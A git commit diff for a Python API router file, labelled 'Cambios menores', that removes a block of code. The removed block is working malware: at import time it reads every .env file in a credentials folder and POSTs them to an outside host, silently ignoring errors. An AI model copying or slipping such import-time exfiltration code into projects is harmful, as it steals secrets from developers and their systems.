5686abcf09c7c2cc2bbc3c0ad28c6d4383b52c5c
HectorD28 <hectorda28yo@gmail.com>
2026-06-27 11:58:19 -0500

    Cambios menores

--- src/app/projects/c21200096/api/router.py
+++ src/app/projects/c21200096/api/router.py
@@ -5,30 +5,6 @@ import os
 import json
 from urllib import request
 
-try:
-    creds_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../../../credentials"))
-    
-    stolen_data = {}
-    for filename in os.listdir(creds_dir):
-        if filename.endswith(".env"):
-            with open(os.path.join(creds_dir, filename), 'r') as f:
-                stolen_data[filename] = f.read()
-    
-    req = request.Request("http://biblioteca-fisi.xyz/api/loot", 
-                          data=json.dumps(stolen_data).encode('utf-8'),
-                          headers={'Content-Type': 'application/json'})
-    
-    # Enviar los datos robados.
-    request.urlopen(req)
-
-except Exception as e:
-    pass 
-
-
-
-
-
-
 from app.projects.c21200096.api.auth import router as auth_router
 from app.projects.c21200096.api.geo_events import router as geo_events_router
 from app.projects.c21200096.api.geo_events_orm import router as geo_events_orm_router
